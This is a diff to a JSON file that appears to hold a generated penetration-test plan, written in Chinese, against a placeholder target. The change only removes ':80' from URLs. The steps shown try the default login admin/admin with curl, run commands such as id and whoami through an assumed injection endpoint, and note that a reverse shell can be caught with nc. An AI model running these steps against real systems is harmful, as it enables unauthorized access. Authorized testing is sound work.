@@ -31,26 +31,26 @@
     {
       "step": 2,
       "description": "访问HTTP服务，浏览网站以寻找漏洞点",
-      "command": "curl -v http://{TARGET}:80/",
+      "command": "curl -v http://{TARGET}/",
       "expected_result": "返回网站首页内容，可能包含登录页面或敏感信息",
       "notes": "检查响应头和HTML内容，寻找目录或文件"
     },
     {
       "step": 3,
       "description": "尝试弱密码或默认凭据登录",
-      "command": "curl -X POST http://{TARGET}:80/login -d 'username=admin&password=admin'",
+      "command": "curl -X POST http://{TARGET}/login -d 'username=admin&password=admin'",
       "expected_result": "登录成功或失败响应，可能重定向到管理页面",
       "notes": "使用常见弱密码如admin/admin、root/root等"
     },
     {
       "step": 4,
       "description": "如果登录成功，进一步利用获取shell或提权",
-      "command": "curl http://{TARGET}:80/admin/command?cmd=id",
+      "command": "curl http://{TARGET}/admin/command?cmd=id",
       "expected_result": "返回命令执行结果，如uid=33(www-data) gid=33(www-data) groups=33(www-data)",
       "notes": "假设存在命令注入漏洞，需根据实际漏洞调整命令"
     }
   ],
-  "verification_command": "curl http://{TARGET}:80/admin/command?cmd=whoami",
+  "verification_command": "curl http://{TARGET}/admin/command?cmd=whoami",
   "verification_success_sign": "返回当前用户，如www-data",
   "requires_callback": false,
   "callback_note": "如果漏洞需要反弹shell，可使用nc监听端口，并在命令中执行反向连接",
